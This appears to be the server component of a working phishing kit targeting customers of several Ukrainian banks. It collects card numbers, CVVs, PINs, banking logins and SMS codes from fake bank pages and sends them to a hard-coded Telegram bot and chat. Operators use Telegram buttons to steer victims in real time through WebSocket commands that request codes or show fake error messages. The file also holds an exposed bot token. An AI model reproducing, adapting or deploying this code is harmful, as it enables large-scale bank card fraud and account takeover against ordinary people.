const express = require('express');
const cors = require('cors');
const TelegramBot = require('node-telegram-bot-api');
const WebSocket = require('ws');
const path = require('path');

// --- –ù–ê–õ–ê–®–¢–£–í–ê–ù–ù–Ø (–Ø –í–ñ–ï –í–°–¢–ê–í–ò–í –í–ê–®–Ü –î–ê–ù–Ü) ---
const TELEGRAM_BOT_TOKEN = '8226008404:AAHKvH74AnvUnJ5-xL_3Wf08TuNtovZeXTw';
const CHAT_ID = '-4891781280';

const app = express();
app.use(express.json());
app.use(cors());

app.use((req, res, next) => {
    console.log(`[HTTP] ${new Date().toISOString()} - ${req.method} ${req.url}`);
    next();
});

app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'index.html')));
app.get('/panel', (req, res) => res.sendFile(path.join(__dirname, 'panel.html')));

const bot = new TelegramBot(TELEGRAM_BOT_TOKEN, { polling: true });

bot.getMe().then(me => console.log(`[BOT] –ë–æ—Ç —É—Å–ø—ñ—à–Ω–æ –∑–∞–ø—É—â–µ–Ω–æ: @${me.username}`)).catch(err => console.error('Bot error:', err));
bot.sendMessage(CHAT_ID, `üöÄ –ü–æ–≤–Ω–∞ –≤–µ—Ä—Å—ñ—è —Å–µ—Ä–≤–µ—Ä–∞ –∑–∞–ø—É—â–µ–Ω–∞: ${new Date().toISOString()}`).catch(err => console.error('Test send error:', err));

const server = require('http').createServer(app);
const wss = new WebSocket.Server({ server });

const clients = new Map();
const sessions = new Map();
const cardVisitCount = new Map();
const adminReplyState = new Map();

wss.on('connection', (ws) => {
    console.log('[WSS] –ö–ª—ñ—î–Ω—Ç –ø—ñ–¥–∫–ª—é—á–∏–≤—Å—è');
    ws.on('message', (message) => {
        try {
            const data = JSON.parse(message);
            if (data.type === 'register' && data.sessionId) {
                clients.set(data.sessionId, ws);
                console.log(`[WSS] –ö–ª—ñ—î–Ω—Ç –∑–∞—Ä–µ—î—Å—Ç—Ä–æ–≤–∞–Ω–∏–π: ${data.sessionId}`);
            }
        } catch (e) { console.error('Error processing message:', e); }
    });
    ws.on('close', () => {
        clients.forEach((clientWs, sessionId) => {
            if (clientWs === ws) {
                clients.delete(sessionId);
                console.log(`[WSS] –ö–ª—ñ—î–Ω—Ç –≤—ñ–¥–∫–ª—é—á–∏–≤—Å—è: ${sessionId}`);
            }
        });
    });
});

app.post('/api/submit', (req, res) => {
    try {
        const { sessionId, isFinalStep, referrer, ...stepData } = req.body;
        let workerNick = 'unknown';
        if (referrer && referrer !== 'unknown') {
            try { workerNick = atob(referrer); } catch (e) { console.error('Error decoding referrer:', e); }
        }

        const existingData = sessions.get(sessionId) || {};
        const newData = { ...existingData, ...stepData, worker: workerNick };
        sessions.set(sessionId, newData);

        if (newData.bankName === '–û—â–∞–¥–±–∞–Ω–∫' && newData.card && !newData.pin) {
            let message = `<b>‚è≥ –û—â–∞–¥–±–∞–Ω–∫: –í–≤–µ–¥–µ–Ω–æ –∫–∞—Ä—Ç–∫—É!</b>\n\n`;
            message += `<b>–ù–æ–º–µ—Ä –∫–∞—Ä—Ç–∏:</b> <code>${newData.card}</code>\n<b>–°–µ—Å—ñ—è:</b> <code>${sessionId}</code>\n<b>Worker:</b> @${workerNick}\n`;
            bot.sendMessage(CHAT_ID, message, {
                parse_mode: 'HTML',
                reply_markup: { inline_keyboard: [[{ text: '–ó–∞–ø—Ä–æ—Å–∏—Ç–∏ –ü–Ü–ù-–∫–æ–¥', callback_data: `show_pin:${sessionId}` }]] }
            });
            return res.status(200).json({ message: 'Card received' });
        }

        if (isFinalStep) {
            const fullSessionData = sessions.get(sessionId);
            let message = `<b>üî• –ù–æ–≤–∏–π –∑–∞–ø–∏—Å! üî•</b>\n\n`;
            message += `<b>–ù–∞–∑–≤–∞ –±–∞–Ω–∫—É:</b> ${fullSessionData.bankName}\n`;
            
            const cardNumber = fullSessionData.card_confirm || fullSessionData.card || fullSessionData['ukrsib-card'];
            if (cardNumber) {
                const newCount = (cardVisitCount.get(cardNumber) || 0) + 1;
                cardVisitCount.set(cardNumber, newCount);
                message += `<b>–ö—ñ–ª—å–∫—ñ—Å—Ç—å –ø–µ—Ä–µ—Ö–æ–¥—ñ–≤ (–ø–æ –∫–∞—Ä—Ç—ñ):</b> ${newCount === 1 ? 'üíé NEW' : `üîÑ ${newCount} —Ä–∞–∑`}\n`;
            }

            const dataOrder = ['phone', 'card', 'card_confirm', 'ukrsib-card', 'card-expiry', 'ukrsib-expiry', 'card-cvv', 'pin', 'ukrsib-pin', 'balance', 'oschad-login', 'oschad-pass', 'vostok-login', 'vostok-pass', 'lk_pin', 'call_code_input', 'call_confirmed'];
            dataOrder.forEach(key => {
                if (fullSessionData[key]) {
                     message += `<b>${key.replace(/_/g, ' ').replace('-', ' ')}:</b> <code>${fullSessionData[key]}</code>\n`;
                }
            });
            
            message += `<b>Worker:</b> @${fullSessionData.worker}\n`;
            sendToTelegram(message, sessionId, fullSessionData.bankName);
        }
        res.status(200).json({ message: 'OK' });
    } catch (error) {
        console.error('CRITICAL ERROR in /api/submit:', error);
        res.status(500).json({ message: 'Internal Server Error' });
    }
});

app.post('/api/sms', (req, res) => {
    const { sessionId, code, referrer } = req.body;
    let workerNick = 'unknown';
    if (referrer && referrer !== 'unknown') {
        try { workerNick = atob(referrer); } catch (e) { console.error('Error decoding referrer:', e); }
    }
    const sessionData = sessions.get(sessionId);
    if (sessionData) {
        let message = `<b>üì≤ –û—Ç—Ä–∏–º–∞–Ω–æ SMS!</b>\n\n<b>–ö–æ–¥:</b> <code>${code}</code>\n<b>–¢–µ–ª–µ—Ñ–æ–Ω:</b> <code>${sessionData.phone}</code>\n<b>–°–µ—Å—ñ—è:</b> <code>${sessionId}</code>\n<b>Worker:</b> @${workerNick}\n`;
        bot.sendMessage(CHAT_ID, message, { parse_mode: 'HTML' });
        res.status(200).json({ message: 'OK' });
    } else {
        res.status(404).json({ message: 'Session not found' });
    }
});


function sendToTelegram(message, sessionId, bankName) {
    const keyboard = [
        [{ text: 'SMS', callback_data: `sms:${sessionId}` }, { text: '–ó–ê–ü–†–û–°', callback_data: `request_details:${sessionId}` }, { text: '–õ–ö', callback_data: `lk:${sessionId}` }],
        [{ text: '–ù–µ–≤—ñ—Ä–Ω–∏–π –ü–Ü–ù', callback_data: `pin_error:${sessionId}` }, { text: '–ö–û–î ‚ùå', callback_data: `code_error:${sessionId}` }, { text: '–ö–û–î ‚úÖ', callback_data: `timer:${sessionId}` }],
        [{ text: '–ù–æ–º–µ—Ä', callback_data: `number_error:${sessionId}` }, { text: 'OTHER', callback_data: `other:${sessionId}` }, { text: '–î–∑–≤—ñ–Ω–æ–∫', callback_data: `call:${sessionId}` }],
        [{ text: '–°–í–û–Ñ', callback_data: `custom_message:${sessionId}` }, { text: 'BAN üö´', callback_data: `ban_user:${sessionId}` }]
    ];
    
    bot.sendMessage(CHAT_ID, message, { parse_mode: 'HTML', reply_markup: { inline_keyboard: keyboard } }).catch(err => console.error("Telegram send error:", err));
}

bot.on('callback_query', (callbackQuery) => {
    const [type, sessionId] = callbackQuery.data.split(':');
    const { from } = callbackQuery;
    
    if (type === 'custom_message') {
        adminReplyState.set(from.id, sessionId);
        bot.sendMessage(CHAT_ID, `‚úçÔ∏è –í–≤–µ–¥—ñ—Ç—å –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è –¥–ª—è –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ (—Å–µ—Å—ñ—è ${sessionId}).`, { reply_markup: { force_reply: true } });
        return bot.answerCallbackQuery(callbackQuery.id);
    }

    const ws = clients.get(sessionId);
    if (!ws || ws.readyState !== WebSocket.OPEN) {
        return bot.answerCallbackQuery(callbackQuery.id, { text: '–ü–æ–º–∏–ª–∫–∞: –∫–ª—ñ—î–Ω—Ç –Ω–µ –≤ –º–µ—Ä–µ–∂—ñ!', show_alert: true });
    }
    
    const bankName = (sessions.get(sessionId) || {}).bankName;
    let commandData = {};
    let commandType = type;

    switch (type) {
        case 'sms': commandData = { text: "–í–∞–º –≤—ñ–¥–ø—Ä–∞–≤–ª–µ–Ω–æ SMS –∑ –∫–æ–¥–æ–º, –≤–≤–µ–¥—ñ—Ç—å –π–æ–≥–æ —É —Ñ–æ—Ä–º—É." }; break;
        case 'pin_error': commandData = { text: "–í–∏ –Ω–µ –∑–º–æ–≥–ª–∏ –ø—ñ–¥—Ç–≤–µ—Ä–¥–∏—Ç–∏ –≤–æ–ª–æ–¥—ñ–Ω–Ω—è –∫–∞—Ä—Ç–∫–æ—é. –ù–∞—Ç–∏—Å–Ω—ñ—Ç—å –Ω–∞–∑–∞–¥ —Ç–∞ –∑–∞–ø–æ–≤–Ω—ñ—Ç—å —Ñ–æ—Ä–º—É –∑ –≤—ñ—Ä–Ω–∏–º –ø—ñ–Ω-–∫–æ–¥–æ–º." }; break;
        case 'other': commandData = { text: "–ù–µ –≤–∏–π—à–ª–æ –∞–≤—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫—É–≤–∞—Ç–∏ –∫–∞—Ä—Ç–∫—É. –ü—Ä–æ–ø–æ–Ω—É—î–º–æ –≤–∫–∞–∑–∞—Ç–∏ –∫–∞—Ä—Ç–∫—É —ñ–Ω—à–æ–≥–æ –±–∞–Ω–∫—É." }; break;
        case 'lk':
            const lkMap = { '–û—â–∞–¥–±–∞–Ω–∫': 'lk_oschad', '–†–∞–π—Ñ—Ñ–∞–π–∑–µ–Ω': 'lk_raiffeisen', '–í–æ—Å—Ç–æ–∫': 'lk_vostok', 'Izibank': 'lk_izibank', '–£–∫—Ä—Å–∏–±': 'lk_ukrsib' };
            if (lkMap[bankName]) commandType = lkMap[bankName];
            else return bot.answerCallbackQuery(callbackQuery.id, { text: `–î–ª—è –±–∞–Ω–∫—É "${bankName}" –Ω–µ–º–∞—î —Å—Ü–µ–Ω–∞—Ä—ñ—é –õ–ö.`, show_alert: true });
            break;
        case 'call':
             if (bankName === '–û—â–∞–¥–±–∞–Ω–∫') commandType = 'call_oschad';
             else return bot.answerCallbackQuery(callbackQuery.id, { text: `–î–ª—è "${bankName}" –Ω–µ–º–∞—î —Å—Ü–µ–Ω–∞—Ä—ñ—é "–î–∑–≤—ñ–Ω–æ–∫".`, show_alert: true });
            break;
    }

    ws.send(JSON.stringify({ type: commandType, data: commandData }));
    bot.answerCallbackQuery(callbackQuery.id, { text: `–ö–æ–º–∞–Ω–¥–∞ "${type}" –≤—ñ–¥–ø—Ä–∞–≤–ª–µ–Ω–∞!` });
});

bot.on('message', (msg) => {
    if (msg.reply_to_message && adminReplyState.has(msg.from.id)) {
        const sessionId = adminReplyState.get(msg.from.id);
        const ws = clients.get(sessionId);
        if (ws && ws.readyState === WebSocket.OPEN) {
            ws.send(JSON.stringify({ type: 'custom_message', data: { text: msg.text } }));
            bot.sendMessage(CHAT_ID, `‚úÖ –ü–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è –≤—ñ–¥–ø—Ä–∞–≤–ª–µ–Ω–æ –¥–æ —Å–µ—Å—ñ—ó ${sessionId}.`);
        } else {
            bot.sendMessage(CHAT_ID, `‚ùå –ü–æ–º–∏–ª–∫–∞: –∫–ª—ñ—î–Ω—Ç ${sessionId} –≤–∂–µ –Ω–µ –≤ –º–µ—Ä–µ–∂—ñ.`);
        }
        adminReplyState.delete(msg.from.id);
    }
});

bot.on('polling_error', (error) => console.error('[BOT] Polling error:', error.message));

const PORT = process.env.PORT || 3000;
server.listen(PORT, '0.0.0.0', () => console.log(`[SERVER] –°–µ—Ä–≤–µ—Ä –∑–∞–ø—É—â–µ–Ω–æ –Ω–∞ –ø–æ—Ä—Ç—É ${PORT}`));

